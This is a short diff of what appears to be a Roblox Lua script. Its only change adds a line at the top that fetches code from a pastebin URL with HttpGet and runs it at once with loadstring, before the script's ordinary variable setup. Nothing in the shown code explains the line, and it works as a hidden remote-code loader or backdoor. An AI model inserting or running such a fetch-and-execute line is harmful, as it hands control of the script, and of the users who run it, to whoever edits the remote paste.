@@ -1,3 +1,4 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/XQp2bfhe'))()
 -- variables ofc
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
